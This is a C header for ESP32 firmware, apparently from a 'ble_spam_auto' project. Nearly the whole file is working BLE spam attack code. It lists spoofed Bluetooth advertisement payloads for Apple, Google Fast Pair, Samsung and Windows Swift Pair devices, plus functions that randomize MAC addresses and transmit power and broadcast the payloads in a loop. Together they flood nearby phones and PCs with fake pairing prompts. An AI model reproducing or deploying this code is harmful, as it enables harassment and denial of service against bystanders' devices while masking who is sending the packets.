#pragma once

#include "globals.h"

// ============================================================
// BLE Payloads (from ble_spam_auto)
// ============================================================
const uint8_t APPLE_DEVICES[][31] PROGMEM = {
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x03,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x05,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
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  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x2f,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}
};
#define APPLE_DEVICES_COUNT 22

const uint8_t APPLE_SHORT_DEVICES[][23] PROGMEM = {
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x01,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x06,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x20,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
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  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x24,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00}
};
#define APPLE_SHORT_COUNT 13

const uint32_t ANDROID_MODEL_IDS[] PROGMEM = {
  // Google Pixel Buds
  0x000047,0x470000,0x0600F0,0x0600F1,0xD800FE,
  // Google / Pixel devices
  0x03F5D4,0x8D5B67,0x989D0A,0x821F66,0xCD8256,0x3B41C2,0x7B2732,0x5BA2E0,0x0B5996,0x9B29A6,
  // Samsung Galaxy Buds & devices
  0x8D13B9,0xA7C62B,0xA7C62C,0xA7C62D,0xA7C62E,0xA7C62F,
  0x99F098,0xA45EF5,0xA45EF6,0xA45EF7,0xA45EF8,0xC14CA0,0xD1698E,0xF52494,
  // Sony
  0x04AFF8,0x04B002,0x04B003,0x04B004,0x04B005,0xC37FBE,
  // JBL
  0x02AA91,0x02AA92,0x02AA93,0x02AA94,0x02AA95,0x02AA96,0x02AA97,0x02AA98,0x02AA99,0x02AA9A,
  0x02AB60,0x02AB61,0x02AB62,0x02AB63,
  // Bose
  0x05A963,0x05A964,0x05A965,0x05A966,0xF00209,
  // Automotive
  0xCC93A5,0x9DB896,0x7C74F0,0x3E8E2C,0xF8B635,0x5792F0,0xE49ECA,0x2D7A23,
  // Other popular devices
  0xC7A267,0x091300,0x1E89A7,0x1E89A8,0x1E89A9,0x0C0B67,0x0C0B68,0x0C0B69,
  0x7A754A,0x8520F4,0x8520F5,0x62C8E4,0x62C8E5,0x62C8E6,
  // Trackers / Tags
  0xD446A7,0x2C09D0,0xAABBCC,0xAABBCD,0xAABBCE,0x5AFCE4,
  // Misc
  0xF49F36,0xF49F37,0x72EF8D,0xFACE01,0xFACE02,0xFACE03
};
#define ANDROID_MODEL_IDS_COUNT 93

const uint8_t SAMSUNG_DEVICES[26] PROGMEM = {
  0x1A,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0x0C,
  0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x1B,0x1C,0x1D,0x1E,0x20
};

// ============================================================
// BLE Helper Functions
// ============================================================
void generateRandomMAC(esp_bd_addr_t addr) {
  for (int i = 0; i < 6; i++) addr[i] = random(256);
  addr[0] |= 0xF0;
}

void randomizeTxPower() {
  int r = random(100);
  if (r < 70) esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
  else if (r < 85) esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER-1));
  else if (r < 95) esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER-2));
  else if (r < 99) esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER-3));
  else esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER-4));
}

void ensureBLEInit() {
  if (!bleInitialized) {
    BLEDevice::init("");
    esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);
    advertising = BLEDevice::getAdvertising();
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
    bleInitialized = true;
  }
}

void sendBLEPacket(BLEAdvertisementData &advData) {
  ensureBLEInit();
  radioTxBusy = true;
  esp_bd_addr_t addr;
  generateRandomMAC(addr);
  int advType = random(3);
  if (advType==0) advertising->setAdvertisementType(ADV_TYPE_IND);
  else if (advType==1) advertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
  else advertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
  advertising->setDeviceAddress(addr, BLE_ADDR_TYPE_RANDOM);
  advertising->setAdvertisementData(advData);
  advertising->setMinInterval(0x20); advertising->setMaxInterval(0x20);
  advertising->setMinPreferred(0x20); advertising->setMaxPreferred(0x20);
  digitalWrite(BLUE_LED_PIN, HIGH);
  advertising->start();
  delay(150);
  advertising->stop();
  digitalWrite(BLUE_LED_PIN, LOW);
  radioTxBusy = false;
  randomizeTxPower();
  packetCount++;
}

// ============================================================
// BLE Spam Functions
// ============================================================
void spamApple() {
  BLEAdvertisementData d;
  uint8_t payload31[31];
  memcpy_P(payload31, APPLE_DEVICES[random(APPLE_DEVICES_COUNT)], 31);
  d.addData((char*)payload31, 31);
  sendBLEPacket(d);

  BLEAdvertisementData d2;
  uint8_t payload23[23];
  memcpy_P(payload23, APPLE_SHORT_DEVICES[random(APPLE_SHORT_COUNT)], 23);
  d2.addData((char*)payload23, 23);
  sendBLEPacket(d2);
}

void spamAndroid() {
  uint32_t mid = ANDROID_MODEL_IDS[random(ANDROID_MODEL_IDS_COUNT)];
  uint8_t data[14]; int i=0;
  data[i++]=3; data[i++]=0x03; data[i++]=0x2C; data[i++]=0xFE;
  data[i++]=6; data[i++]=0x16; data[i++]=0x2C; data[i++]=0xFE;
  data[i++]=(uint8_t)((mid>>16)&0xFF);
  data[i++]=(uint8_t)((mid>>8)&0xFF);
  data[i++]=(uint8_t)(mid&0xFF);
  data[i++]=2; data[i++]=0x0A; data[i++]=(uint8_t)((rand()%120)-100);
  BLEAdvertisementData d;
  d.addData((char*)data, 14);
  sendBLEPacket(d);
}

void spamSamsung() {
  uint8_t model = SAMSUNG_DEVICES[random(26)];
  uint8_t data[15]; int i=0;
  data[i++]=14; data[i++]=0xFF; data[i++]=0x75; data[i++]=0x00;
  data[i++]=0x01; data[i++]=0x00; data[i++]=0x02; data[i++]=0x00;
  data[i++]=0x01; data[i++]=0x01; data[i++]=0xFF; data[i++]=0x00;
  data[i++]=0x00; data[i++]=0x43; data[i++]=(model>>0x00)&0xFF;
  BLEAdvertisementData d;
  d.addData((char*)data, 15);
  sendBLEPacket(d);
}

void spamWindows() {
  const char* WIN_NAMES[] = {
    "Surface Mouse", "Arc Mouse", "Xbox Controller",
    "Surface Keyboard", "BT Speaker", "WH-1000XM5",
    "AirPods Pro", "Galaxy Buds2", "Bose QC45",
    "JBL Flip 6", "Logitech MX", "Razer DeathAdder",
    "Sony WF-1000", "Pixel Buds", "Nothing Ear",
    "Marshall Major", "Beats Studio", "HyperX Cloud",
    "Sennheiser HD", "Jabra Elite 85"
  };
  const char* Name = WIN_NAMES[random(20)];
  uint8_t nl = strlen(Name);
  uint8_t data[7+nl]; int i=0;
  data[i++]=7+nl-1; data[i++]=0xFF; data[i++]=0x06; data[i++]=0x00;
  data[i++]=0x03; data[i++]=0x00; data[i++]=0x80;
  memcpy(&data[i],Name,nl); i+=nl;
  BLEAdvertisementData d;
  d.addData((char*)data, 7+nl);
  sendBLEPacket(d);
}

void spamAll() {
  spamApple(); delay(5);
  spamAndroid(); delay(5);
  spamSamsung(); delay(5);
  spamWindows(); delay(5);
}
